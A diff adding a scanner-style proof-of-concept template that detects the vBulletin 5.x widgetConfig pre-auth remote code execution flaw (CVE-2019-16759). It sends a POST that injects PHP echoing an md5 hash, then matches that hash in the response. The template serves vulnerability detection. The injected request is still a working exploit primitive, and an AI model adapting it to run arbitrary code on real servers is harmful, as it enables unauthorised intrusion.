@@ -1,0 +1,42 @@
+[info]
+author = "AVE"
+description = "向 vBulletin 的 ajax/render/widget_tabbedcontainer_tab_panel 路由发送 POST 请求，通过 subWidgets[0][config][code] 参数注入 PHP 代码执行 md5 函数，根据响应中是否包含特定哈希值判断漏洞是否存在。"
+id = "POC-AVE-2019-0808"
+name = "vBulletin 5.x widgetConfig 远程代码执行漏洞 PoC"
+severity = "critical"
+tags = [
+    "cve-2019-16759",
+    "vbulletin",
+    "rce",
+    "pre-auth",
+]
+vuln_id = [
+    "CVE-2019-16759",
+    "AVE-2019-0808",
+]
+
+[poc]
+logic = "all"
+
+[[poc.requests]]
+method = "POST"
+path = "/{{BaseURL}}/ajax/render/widget_tabbedcontainer_tab_panel"
+protocol = "http"
+
+[poc.requests.body]
+content = "subWidgets[0][template]=widget_php&subWidgets[0][config][code]=echo%20md5%28%22CVE-2019-16759%22%29%3B"
+type = "raw"
+
+[poc.requests.headers]
+Content-Type = "application/x-www-form-urlencoded"
+
+[[poc.requests.matchers]]
+expect = true
+part = "body"
+type = "word"
+words = ["addcc9f9f2f40e2e6aca3079b73d9d17"]
+
+[[poc.requests.matchers]]
+expect = true
+status = [200]
+type = "status"
